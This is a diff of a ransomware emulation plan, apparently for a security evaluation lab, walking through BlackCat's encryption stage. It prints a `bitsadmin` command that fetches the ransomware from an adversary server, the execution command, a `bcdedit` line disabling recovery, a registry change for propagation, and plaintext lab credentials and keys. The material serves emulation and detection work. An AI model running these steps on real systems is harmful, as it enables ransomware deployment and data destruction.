   | BlackCat (Linux) leaves ransom notes | [drop_ransom_note](../Resources/blackcat/src/encrypt.rs#L184) | T1491.001 Defacement: Internal Defacement | [Microsoft](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Linux/BlackCat.A!MTB) |
@@ -721,43 +784,45 @@ providing the Linux KVM server administrator credentials when prompted
 ## Step 6 - Encryption for Impact/Inhibit System Discovery
 
 ### :microphone: Voice Track
+
 The BlackCat affliate downloads `BlackCat (Windows)` to the bastion host
 `kimeramon (10.20.20.11)` and provides the Domain Admin credentials
 `ykaida.da` to run the executable with administrative privileges.
 
 `BlackCat (Windows)` will:
-- Delete volume shadow copies via API calls
-- Disable bootloader recovery using `bcdedit /set {default} recoveryenabled No`
-- Run command to collect Universally Unique Identifiers (UUIDs) via `WMIC.exe`
-- Get current username and current hostname
-- Enable remote-to-local and remote-to-remote symbolic link evaluation via `fsutil`
-- Empty the recycling bin
-- Modify the registry to increase the maximum limit of concurrent network
+* Delete volume shadow copies via API calls
+* Disable bootloader recovery using `bcdedit /set {default} recoveryenabled No`
+* Run command to collect Universally Unique Identifiers (UUIDs) via `WMIC.exe`
+* Get current username and current hostname
+* Enable remote-to-local and remote-to-remote symbolic link evaluation via `fsutil`
+* Empty the recycling bin
+* Modify the registry to increase the maximum limit of concurrent network
 requests machines can make (for PsExec propagation and accessing remote files):
-  - `reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v MaxMpxCt /d 65535 /t REG_DWORD /f`
-- Propagate via a PsExec module embedded in BlackCat code and compressed with
+  * `reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v MaxMpxCt /d 65535 /t REG_DWORD /f`
+* Propagate via a PsExec module embedded in BlackCat code and compressed with
 zlib
-  - Performs NetBIOS scans on the local network to determine valid Windows hosts to propagate to
-- Enumerate all local disk partitions and mount any hidden partitions for later 
+  * Performs NetBIOS scans on the local network to determine valid Windows hosts to propagate to
+* Enumerate all local disk partitions and mount any hidden partitions for later
 encryption
-- Terminate a pre-defined set of processes and services that may interfere with encryption
-- Encrypt files using AES
-  - `BlackCat` excludes some directories, filenames, and file extensions from
+* Terminate a pre-defined set of processes and services that may interfere with encryption
+* Encrypt files using AES
+  * `BlackCat` excludes some directories, filenames, and file extensions from
   encryption
-  - Encrypted files are appended with `.skyfl2e` at the end the filename. Ex.
+  * Encrypted files are appended with `.skyfl2e` at the end the filename. Ex.
   "[original filename].[extension].skyfl2e"
-  - `BlackCat` will drop ransom notes in directories containing encrypted files
-- After encryption, `BlackCat` will:
-  - Change wallpaper for logged-in users to image of ransom note
-  - Unmount previously mounted partitions
-  - Delete volume shadow copies again
-  - List and clear Windows Event logs via API calls
+  * `BlackCat` will drop ransom notes in directories containing encrypted files
+* After encryption, `BlackCat` will:
+  * Change wallpaper for logged-in users to image of ransom note
+  * Unmount previously mounted partitions
+  * Delete volume shadow copies again
+  * List and clear Windows Event logs via API calls
 
 ### ☣️ Procedures
 
 * Open `cmd.exe` (or use an existing cmd.exe running as `zorimoto`) and execute `BITSAdmin.exe` to download
 BlackCat (Windows) to the bastion host `kimeramon (10.20.20.11)` from the
 adversary server
+
   ```
   bitsadmin /transfer defaultjob6 /download http://the-inator.com/digirevenge/digirevenge.exe %TEMP%\digirevenge.exe
   ```
@@ -772,19 +837,23 @@ when prompted:
 
 * Using the new `cmd.exe` with `ykaida.da` privileges, execute
 BlackCat (Windows)
+
   ```
   C:\Users\zorimoto\AppData\Local\Temp\digirevenge.exe --access-token 15742aa362a84ba3
   ```
 
 #### Verifying BlackCat (Windows) Logs
+
 * :arrow_right: Return to your RDP session to the Windows jumpbox `homelander (116.83.1.29)`
 
 * :arrow_right: From the Windows jumpbox, initiate an RDP session to `blacknoirmon (10.20.10.4)` Subsidiary B Domain Controller as `digirevenge\evals_domain_admin`:
+
   | Username | Password |
   | -------- | -------- |
   | digirevenge\evals_domain_admin | axi9eengei9inaeR@ |
 
 * Open an admin PowerShell prompt and execute the following to fetch the BlackCat logs from affected Subsidiary B hosts, zip them up into a single archive, and SCP the archive to the Kali server:
+
   ```
   $path="C$\Windows\System32\clog.xtlog";
   $destDir="C:\Users\evals_domain_admin\sblogs";
@@ -805,13 +874,15 @@ BlackCat (Windows)
   Remove-Item -Recurse -Force "$destDir";
   Remove-Item -Force "$zipPath";
   ```
+
   * If prompted, type `yes` to continue the connection for SCP
 
 * :arrow_right: Switch to your kali server and open up a terminal window
 
 * Execute the following in the kali terminal to decrypt and inspect the logs:
+
   ```
-  cd 
+  cd
   mv /tmp/sblogs.zip ./
   unzip sblogs.zip
   cd sblogs
@@ -819,11 +890,13 @@ BlackCat (Windows)
     python3 alphv_blackcat/Resources/log_decryptor/aes_base64_log_decryptor.py -i $filename -o dec_$filename --aes-128-ctr -k 4a99bcca87318b844be7928cd98e23f9;
   done
   ```
+
   * Look through each of the decrypted log files (starting with `dec_*`) and make sure all required activity was exected and that nothing was skipped or errored out.
 
 ### :mag: Reference Code & Reporting
-1. https://www.varonis.com/blog/blackcat-ransomware
-1. https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Win32/Blackcat&threatId=-2147158032
+
+1. <https://www.varonis.com/blog/blackcat-ransomware>
+1. <https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Win32/Blackcat&threatId=-2147158032>
 
 <details>
   <summary>:link: Click to expand source code links table</summary>
